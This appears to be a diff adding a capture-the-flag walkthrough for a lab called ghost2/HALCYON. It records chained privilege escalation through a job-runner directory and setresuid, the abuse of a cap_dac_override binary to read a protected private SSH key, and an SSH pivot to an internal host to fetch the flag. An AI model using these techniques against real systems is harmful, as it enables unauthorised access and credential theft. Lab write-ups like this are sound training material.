@@ -1,0 +1,96 @@
+goal: open /etc/halcyon/deploy/ (ops itself cannot), read the brief, and follow
+it to the next box
+
+start: logged in as ghost2, escalated to deploy via the vault credential
+(rotates every reconnect -- re-read /var/backups/.vault/deploy.secret each
+session), then deploy -> builder via hal-deploy-run (level2 notes), then
+builder -> ops via the hal-runner-loop ambient-capability trick (level3
+notes: drop a #!/bin/bash job into /opt/hal-runner/jobs/, wait up to 30s for
+hal-runner-loop to exec it via hal-runner-wrap, call libc setresuid(1002,
+1002,1002) from python3 inside the job to become ops). All of level4 was
+done from INSIDE that same job (setresuid to ops, then act), one job per
+step, cleaning up the previous job file each time before dropping the next.
+
+kael.txt fragment 4 (read as ops in prior session):
+  Root on a build host is not the destination. A build host exists to push
+  somewhere else, and it keeps what it needs to get there. The way to the
+  next box lives in the deploy material. Even ops cannot open it, but you
+  already know the move: one tool here reads past the permission that
+  guards it.
+
+  OBJECTIVE   Open /etc/halcyon/deploy/. Ops cannot, the right tool can. The
+              brief there names the next box and what the deploy rides on.
+  SKILL       CAP_DAC_OVERRIDE, the capability that ignores file permissions.
+  START HERE  getcap, one more time.
+
+recon (as ops, via job):
+  ls -la /etc/halcyon/deploy/          -> Permission denied (even as ops)
+  getcap -r /                          -> same set as levels 1-3, now with
+                                           /usr/local/bin/hal-guard executable
+                                           (-r-xr-x--- ops:ops cap_dac_override=ep)
+  hal-guard with no args (usage):
+    hal-guard: HALCYON deploy-key guard
+    usage: /usr/local/bin/hal-guard <path under /etc/halcyon/deploy/>
+           a directory is listed, a file is printed.
+  hal-guard /etc/halcyon/deploy/       -> lists: id_pipeline, README
+
+exploit -- read the brief:
+  hal-guard /etc/halcyon/deploy/README:
+
+    [ KAEL // the pivot ]
+    Root on this box is the end of the road, not the destination. A build
+    host exists to push to somewhere else, and it holds whatever it needs
+    to reach that somewhere: a key, a token, a trust it was granted and
+    never had revoked. The permissions that say you cannot touch that are
+    only as strong as the tools on this box were built to respect them.
+
+    TARGET       pipeline@ghost2-sd-w1qzdt3o
+    OBJECTIVE    Take what the deploy process rides on, and make the
+                 crossing it makes. Recover the flag waiting on the other
+                 side.
+
+  hal-guard /etc/halcyon/deploy/id_pipeline -> ed25519 OpenSSH private key
+  (the deploy pipeline's own key -- "what the deploy rides on").
+
+finding the target host:
+  getent hosts ghost2-sd-w1qzdt3o  -> 10.67.108.3 (internal /etc/hosts entry
+  ghost2 box resolves it to; ghost2 itself sits on 10.67.108.2/24, same subnet)
+
+exploit -- the crossing:
+  from inside the ops job, wrote the recovered key to /tmp/id_pipeline_copy
+  (chmod 600) and ran:
+    ssh -i /tmp/id_pipeline_copy -o StrictHostKeyChecking=no \
+        -o UserKnownHostsFile=/tmp/known_hosts_pipeline \
+        pipeline@10.67.108.3 'id; hostname; ls -la /home/pipeline; \
+        cat /home/pipeline/flag; cat /home/pipeline/kael.txt'
+
+  result:
+    uid=1000(pipeline) gid=1001(pipeline) groups=1001(pipeline)
+    hostname: a84dfb17ba85  (container id, not the DNS name -- expected)
+    /home/pipeline/flag -> GHS2{eaa77e5a7e4a288c4d5130f45992c6d6}
+
+  banner on connect names it "HALCYON BREACH // ACT II : SERVICES" -- this
+  pipeline host is a new box/act, not just another local level.
+
+flag: GHS2{eaa77e5a7e4a288c4d5130f45992c6d6}
+
+gotcha: /tmp/id_pipeline_copy and /tmp/known_hosts_pipeline (written on the
+ghost2 box, inside the ops-uid job) end up owned by ops. A later cleanup job
+run as builder could not rm them (Operation not permitted) -- harmless
+leftovers, not a blocker, just don't expect builder to tidy up files created
+while the job had escalated to ops.
+
+--- next up (Act II fragment 1, read as pipeline on the new box) ---
+kael.txt on pipeline@ghost2-sd-w1qzdt3o (uid=1000, gid=1001/pipeline):
+  [ KAEL // ACT II -- fragment 1 ]
+  You are in now, through the door I built for exactly this. HALCYON does
+  not wait for a human to push a deploy here. Something runs on its own,
+  on its own schedule, as an account you are not. Reading a script and
+  owning the account that runs it are two different things.
+
+  OBJECTIVE   become the account that automated job runs as
+
+  Go find it. -- i.e. find whatever cron/systemd-timer/daemon runs
+  automatically on this new host, work out what account it runs as, and
+  become that account (likely another capability/permission-leak style
+  move, same house style as ghost2 levels 1-4).
